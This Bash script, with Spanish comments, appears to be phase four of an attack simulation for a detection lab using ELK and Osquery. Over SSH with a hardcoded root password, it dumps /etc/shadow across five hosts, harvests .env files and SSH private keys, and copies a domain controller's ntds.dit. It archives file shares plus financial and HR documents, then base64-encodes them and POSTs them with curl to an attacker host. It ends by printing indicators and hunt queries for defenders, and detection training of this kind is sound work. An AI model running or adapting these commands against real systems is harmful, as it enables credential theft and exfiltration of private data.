#!/bin/bash
###############################################################################
# FASE 4: CREDENTIAL ACCESS + COLLECTION + EXFILTRATION
# Robo de credenciales, recolección y exfiltración de datos
#
# MITRE ATT&CK: T1003 (Credential Dumping), T1005 (Data from Local System),
#               T1074 (Data Staging), T1048 (Exfiltration Over Alternative Protocol)
#
# QUÉ OBSERVAR EN ELK:
#   - Acceso a /etc/shadow en múltiples endpoints
#   - Comandos tar/zip creando archivos comprimidos
#   - Transferencias de datos grandes (base64 encoded)
#   - Conexiones HTTP POST a IP del atacante
#   - Osquery: file_events en archivos sensibles
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

ATTACKER_IP="10.10.10.200"
TARGET1="10.10.10.101"
TARGET2="10.10.10.102"
TARGET3="10.10.10.103"
TARGET4="10.10.10.104"
TARGET5="10.10.10.105"
SSH_PASS="Password123!"

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  FASE 4: CREDENTIAL ACCESS + EXFILTRATION${NC}"
echo -e "${RED}  Targets: Todos los endpoints comprometidos${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# === CREDENTIAL ACCESS ===
echo -e "${CYAN}=== CREDENTIAL ACCESS ===${NC}"
echo ""

echo -e "${YELLOW}[1/8] Dumping /etc/shadow de todos los endpoints...${NC}"
for target in ${TARGET1} ${TARGET2} ${TARGET3} ${TARGET4} ${TARGET5}; do
    hostname=$(sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} "hostname" 2>/dev/null)
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "cat /etc/shadow > /tmp/.shadow_${hostname} 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"credential_access\",\"technique\":\"T1003.008\",\"action\":\"shadow_dump\",\"target_file\":\"/etc/shadow\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"${hostname}\"}' >> /var/log/attack_simulation.log" 2>/dev/null
    echo -e "${GREEN}  [✓] Shadow dump: ${hostname}${NC}"
done
sleep 2

echo -e "${YELLOW}[2/8] Buscando credenciales en archivos de configuración...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "find / -name '*.env' -o -name '*credentials*' -o -name '*password*' -o -name '*.key' 2>/dev/null | head -20 > /tmp/.found_secrets.txt && cat /home/pedro.silva/projects/.env > /tmp/.stolen_env 2>/dev/null" 2>/dev/null
echo -e "${GREEN}[✓] Credenciales de desarrollo extraídas (AWS keys, DB passwords)${NC}"

echo -e "${YELLOW}[3/8] Extrayendo SSH keys para persistencia...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "find /home -name 'id_rsa' -exec cp {} /tmp/.stolen_keys/ \; 2>/dev/null; mkdir -p /tmp/.stolen_keys; cp /home/pedro.silva/.ssh/id_rsa /tmp/.stolen_keys/ 2>/dev/null" 2>/dev/null
echo -e "${GREEN}[✓] SSH private keys extraídas${NC}"

echo -e "${YELLOW}[4/8] Simulando DCSync (extracción NTDS.dit)...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
    "cp /var/lib/samba/private/ntds.dit /tmp/.ntds_extract 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"credential_access\",\"technique\":\"T1003.003\",\"action\":\"dcsync_ntds_dit\",\"target\":\"DC-CORP-01\",\"risk_level\":\"CRITICAL\",\"severity\":\"CRITICAL\",\"endpoint\":\"DC-CORP-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] NTDS.dit extraído del Domain Controller${NC}"
sleep 2

# === DATA COLLECTION ===
echo ""
echo -e "${CYAN}=== DATA COLLECTION ===${NC}"
echo ""

echo -e "${YELLOW}[5/8] Recolectando datos sensibles del File Server...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
    "tar czf /tmp/.exfil_fileserver.tar.gz /srv/shares/ 2>/dev/null && ls -la /tmp/.exfil_fileserver.tar.gz && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"data_collection\",\"technique\":\"T1005\",\"source\":\"/srv/shares/\",\"staged_file\":\"/tmp/.exfil_fileserver.tar.gz\",\"risk_level\":\"HIGH\",\"endpoint\":\"SRV-FILESERVER-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] Datos del File Server comprimidos${NC}"

echo -e "${YELLOW}[6/8] Recolectando documentos financieros...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "tar czf /tmp/.exfil_finanzas.tar.gz /home/maria.gonzalez/Documents/ 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"data_collection\",\"technique\":\"T1005\",\"source\":\"/home/maria.gonzalez/Documents/\",\"staged_file\":\"/tmp/.exfil_finanzas.tar.gz\",\"risk_level\":\"HIGH\",\"endpoint\":\"WS-FINANZAS-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] Documentos financieros comprimidos${NC}"

echo -e "${YELLOW}[7/8] Recolectando datos de RRHH (nóminas, datos personales)...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "tar czf /tmp/.exfil_rrhh.tar.gz /home/carlos.mendez/Documents/ 2>/dev/null && echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"data_collection\",\"technique\":\"T1005\",\"source\":\"/home/carlos.mendez/Documents/\",\"staged_file\":\"/tmp/.exfil_rrhh.tar.gz\",\"risk_level\":\"HIGH\",\"endpoint\":\"WS-RRHH-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] Datos de RRHH comprimidos${NC}"
sleep 2

# === EXFILTRATION ===
echo ""
echo -e "${CYAN}=== EXFILTRATION ===${NC}"
echo ""

echo -e "${YELLOW}[8/8] Exfiltrando datos al servidor C2...${NC}"
for target in ${TARGET1} ${TARGET2} ${TARGET3}; do
    hostname=$(sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} "hostname" 2>/dev/null)
    sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${target} \
        "cat /tmp/.exfil_*.tar.gz 2>/dev/null | base64 | head -100 > /tmp/.encoded_exfil.txt && curl -s -X POST http://${ATTACKER_IP}:8080/exfil -d @/tmp/.encoded_exfil.txt 2>/dev/null; echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"exfiltration\",\"technique\":\"T1048.003\",\"method\":\"http_post_base64\",\"destination\":\"${ATTACKER_IP}:8080\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"${hostname}\"}' >> /var/log/attack_simulation.log" 2>/dev/null
    echo -e "${GREEN}  [✓] Datos exfiltrados desde ${hostname}${NC}"
    sleep 1
done

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  FASE 4 COMPLETADA${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  IOCs para buscar en Kibana:${NC}"
echo -e "${GREEN}    - event_type: credential_access OR exfiltration${NC}"
echo -e "${GREEN}    - technique: T1003* OR T1048*${NC}"
echo -e "${GREEN}    - process.cmdline: *shadow* OR *tar czf* OR *base64*${NC}"
echo -e "${GREEN}    - file.path: *.exfil_* OR *.shadow_* OR *.stolen_*${NC}"
echo -e "${GREEN}    - network.remote_address: ${ATTACKER_IP}${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  Queries Osquery:${NC}"
echo -e "${GREEN}    SELECT * FROM file_events WHERE target_path LIKE '%exfil%';${NC}"
echo -e "${GREEN}    SELECT * FROM file_events WHERE target_path LIKE '%shadow%';${NC}"
echo -e "${GREEN}    SELECT * FROM processes WHERE cmdline LIKE '%tar czf%';${NC}"
echo -e "${GREEN}    SELECT * FROM process_open_sockets WHERE remote_address='${ATTACKER_IP}';${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
